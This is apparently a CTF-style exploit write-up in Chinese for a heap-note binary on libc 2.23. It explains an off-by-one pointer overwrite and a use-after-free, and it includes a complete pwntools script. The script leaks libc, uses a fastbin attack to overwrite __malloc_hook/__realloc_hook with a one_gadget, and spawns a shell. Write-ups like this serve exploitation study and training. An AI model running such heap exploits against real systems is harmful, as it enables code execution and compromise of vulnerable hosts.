# 漏洞利用文档

## 执行环境
基于调试记录分析，程序的运行环境如下：
- **二进制类型**：64位ELF可执行文件，动态链接
- **保护机制**：
  - PIE启用：程序基地址随机化（如`0x5581dee00000`）
  - Full RELRO：GOT表只读，防止GOT覆盖
  - Stack Canary：栈保护启用
  - NX启用：数据段不可执行
- **内存布局**：
  - 程序代码段：随机化地址（如`0x5581dee00000`）
  - 堆区域：`0x5581e56cd000-0x5581e56ee000`（大小约132KB）
  - libc基址：`0x783e5dcd9000`（libc-2.23.so）
- **依赖需求**：需要libc库，版本为2.23，程序使用标准输入/输出进行交互

## 漏洞成因
### 关键结构体分析
程序使用全局变量管理笔记本状态：
```c
char unk_202060[0x30];  // 用户名缓冲区，大小0x30字节
int unk_202040;         // 当前笔记大小
void *qword_202090;     // 当前笔记指针
```

### 漏洞分析
1. **Off-by-One溢出漏洞**：
   - 位置：`sub_C60()`函数（更新用户名）
   - 代码：`read(0, &unk_202060, 0x31u)`读取0x31字节，但缓冲区只有0x30字节
   - 影响：溢出1字节覆盖相邻的`qword_202090`笔记指针的最低字节

2. **Use-After-Free (UAF)漏洞**：
   - 位置：`sub_BB1()`删除笔记后，指针被清零，但通过溢出可以重新指向已释放内存
   - 结合堆操作，可以造成UAF条件

3. **堆管理漏洞**：
   - 程序使用单笔记指针，缺乏边界检查
   - 编辑笔记时使用存储的大小，而非实际分配大小，可能造成堆溢出

### 漏洞触发路径
1. 通过用户名更新功能的off-by-one溢出修改笔记指针
2. 利用修改的指针访问已释放堆块，泄露libc地址
3. 通过堆操作构造fastbin攻击，劫持`__malloc_hook`
4. 覆盖hook执行one-gadget获取shell

## 漏洞利用过程
### 内存变化时序表
| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|--------------|----------|
| 1 | `p.recv();payload = b'a'*0x30` | 名称缓冲区填充0x30字节'a' | 准备溢出条件 |
| 2 | `add(size=0x80);add(size=0x10)` | 分配两个堆块：0x90和0x20大小 | 建立堆布局 |
| 3 | `update(content=b'a'*0x30 + p8(0x10))` | 溢出覆盖笔记指针低字节(0x90→0x10) | 修改指针指向错误地址 |
| 4 | `delete()` | 释放第一个堆块进入unsorted bin | 创建UAF条件，泄露libc |
| 5 | `add(size=0x10);update(...)` | 重新分配，再次溢出修改指针 | 控制指针指向libc区域 |
| 6 | `show();libc_leak = ...` | 读取unsorted bin中的main_arena地址 | 计算libc基址 |
| 7-8 | 多次`add()`和`delete()` | 构造fastbin链表，准备攻击 | 堆风水布局 |
| 9-10 | `add(size=0x10);update(...)` | 分配小chunk，溢出修改size | 为fastbin攻击做准备 |
| 11 | `edit(content=p64(libc.sym['__malloc_hook']-0x23))` | 修改fastbin fd指向`__malloc_hook-0x23` | 设置fastbin攻击目标 |
| 12 | `add(size=0x60);add(size=0x60)` | 通过fastbin分配获取hook附近控制权 | 获取任意地址写能力 |
| 13 | `edit(content=b'a'*(0x13-0x8)+p64(one_gadget)+p64(realloc+12))` | 覆盖`__realloc_hook`和`__malloc_hook` | 劫持控制流 |
| 14 | `add(size=0x50)` | 触发malloc，执行one-gadget | 获取shell权限 |
| 15 | `p.interactive()` | 程序切换到`/bin/dash` | 交互式shell |

### 堆布局演变
1. **初始状态**：干净堆，无分配
2. **分配阶段**：创建多个不同大小chunk（0x80, 0x10, 0x60, 0x40）
3. **释放阶段**：选择性地释放chunk进入fastbin/unsorted bin
4. **攻击阶段**：通过溢出和UAF操纵堆元数据，最终劫持`__malloc_hook`

## Exploit
```python
from pwn import *
from pwncli import one_gadget

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample15')
elf = ELF('./data/sample15')
libc = elf.libc
choice_words = '6.exit\n'
menu_add = 1
add_index_words = ''
add_size_words = 'Input the size\n'
add_content_words = ''
menu_del = 2
del_index_words = ''
menu_show = 3
show_index_words = ''
menu_edit = 5
edit_index_words = ''
edit_size_words = ''
edit_content_words = 'Input the note\n'
one_gadget = 0x4527a  # one_gadget地址，用于获取shell

def add(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_add))
    if add_index_words:
        p.sendlineafter(add_index_words, str(index))
    if add_size_words:
        p.sendlineafter(add_size_words, str(size))
    if add_content_words:
        p.sendafter(add_content_words, content)

def delete(index=-1):
    p.sendlineafter(choice_words, str(menu_del))
    if del_index_words:
        p.sendlineafter(del_index_words, str(index))

def show(index=-1):
    p.sendlineafter(choice_words, str(menu_show))
    if show_index_words:
        p.sendlineafter(show_index_words, str(index))

def edit(index=-1, size=-1, content=''):
    p.sendlineafter(choice_words, str(menu_edit))
    if edit_index_words:
        p.sendlineafter(edit_index_words, str(index))
    if edit_size_words:
        p.sendlineafter(edit_size_words, str(size))
    if edit_content_words:
        p.sendafter(edit_content_words, content)

def update(content):
    p.sendlineafter(choice_words, '4')
    p.sendafter('input your name\n', content)

# Step 1: 初始填充名称缓冲区，为后续溢出做准备
p.recv();payload = b'a'*0x30;p.send(payload)

# Step 2: 分配两个堆块，建立堆布局
add(size=0x80);add(size=0x10)

# Step 3: 通过更新名称触发off-by-one溢出，修改笔记指针低字节
update(content=b'a'*0x30 + p8(0x10))

# Step 4: 删除第一个堆块，使其进入unsorted bin，包含libc指针
delete()

# Step 5: 重新分配小chunk，并再次溢出修改指针
add(size=0x10);update(content=b'a'*0x30 + p8(0x30))

# Step 6: 显示笔记内容，泄露libc地址并计算基址
show();libc_leak = u64(p.recv(6).ljust(8, b'\x00'));libc.address = libc_leak - (0x3c4b20 + 0x58)

# Step 7: 分配0x60大小chunk，继续堆布局
add(size=0x60)

# Step 8: 分配多个chunk并选择性释放，构造fastbin攻击条件
add(size=0x40);add(size=0x60);delete()

# Step 9: 分配小chunk
add(size=0x10)

# Step 10: 再次溢出修改指针
update(content=b'a'*0x30 + p8(0x10))

# Step 11: 编辑笔记内容，将fastbin fd指向__malloc_hook-0x23
edit(content=p64(libc.sym['__malloc_hook'] - 0x23))

# Step 12: 通过两次分配获取__malloc_hook附近控制权
add(size=0x60);add(size=0x60)

# Step 13: 覆盖__realloc_hook为one_gadget，__malloc_hook为realloc+12
edit(content=b'a'*(0x13 - 0x8) + p64(libc.address + one_gadget) + p64(libc.sym['realloc'] + 12))

# Step 14: 触发malloc，执行one_gadget获取shell
add(size=0x50)

# Step 15: 进入交互模式，获得shell控制权
p.interactive()
```

### 关键注释说明
- **one_gadget**: libc中的特殊地址，直接执行execve("/bin/sh")
- **off-by-one溢出**: 利用名称缓冲区溢出1字节修改相邻指针
- **fastbin攻击**: 通过操纵fastbin链表实现任意地址分配
- **hook劫持**: 覆盖`__malloc_hook`和`__realloc_hook`劫持控制流
- **堆布局**: 精心安排分配和释放顺序，构造可利用的堆状态

该漏洞利用成功结合了off-by-one溢出、UAF和fastbin攻击，最终通过hook劫持获得shell权限。
